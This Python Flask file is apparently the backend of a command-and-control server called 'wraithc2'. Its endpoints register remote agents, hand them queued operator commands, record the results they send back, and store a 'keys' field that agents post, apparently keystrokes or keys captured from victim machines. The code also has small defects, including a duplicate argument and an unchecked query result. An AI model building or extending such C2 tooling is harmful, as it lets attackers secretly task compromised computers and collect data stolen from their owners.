import subprocess

from flask_restful import Resource, reqparse
from wraithc2 import db
from wraithc2.models import Tasks, Keys
from datetime import datetime
import json



class AgentEndpoint(Resource):
    parser = reqparse.RequestParser()
    parser.add_argument('agent',
                        type=str,
                        required=False,
                        help="This field cannot be blank."
                        )
    parser.add_argument('result',
                        type=str,
                        required=False,
                        help="This field cannot be blank."
                        )
    parser.add_argument('command',
                        type=str,
                        required=False,
                        help="This field cannot be blank."
                        )
    parser.add_argument('time',
                        type=str,
                        required=False,
                        help="This field cannot be blank."
                        )
    parser.add_argument('agent',
                        type=str,
                        required=False,
                        help="This field cannot be blank."
                        )
    parser.add_argument('author',
                        type=str,
                        required=False,
                        help="This field cannot be blank."
                        )
    parser.add_argument('feedback',
                        type=str,
                        required=False,
                        help="This field cannot be blank."
                        )


    def post(self):
        data = AgentEndpoint.parser.parse_args()
        check = Tasks.query.filter_by(agent=data['agent']).first()
        if check is None:
            task = Tasks(time=datetime.utcnow(), command="[!]AGENT REGISTERED", agent=data["agent"], author=data["agent"], result="SUCCESS")
            db.session.add(task)
            db.session.commit()
            return {"message": "Agent registered successfully."}, 201
        else:
            return {"message": "Agent already registered."}, 400

    def put(self):
        data = AgentEndpoint.parser.parse_args()
        check = Tasks.query.filter_by(agent=data['agent']).filter_by(command=data['command']).filter_by(time=data['time']).filter_by(author=data['author']).first()
        print(check)
        if check.result != 'SUCCESS':
            check.result = data['result']
            check.feedback = data['feedback']
            db.session.commit()
            return {"message": "Task updated successfully."}, 201
        else:
            return {"message": "Task already failed or completed."}, 400


    def get(self):
        data = AgentEndpoint.parser.parse_args()
        # ensure that agents post a get request containing its agent JSON
        check = Tasks.query.filter_by(agent=data['agent']).filter_by(result='PENDING').first()
        if check:
            value = {'agent': check.agent, 'command': check.command, 'time': check.time, 'author': check.author}
            print(json.dumps(value))
            return json.dumps(value)
        else:
            return json.dumps({"none": " no current tasks for this agent"})



class KeysEndpoint(Resource):
    parser = reqparse.RequestParser()
    parser.add_argument('keys',
                        type=str,
                        required=False,
                        help="This field cannot be blank."
                        )
    def post(self):
        data = KeysEndpoint.parser.parse_args()
        print(data)
        keys = Keys(keys=data['keys'])
        db.session.add(keys)
        db.session.commit()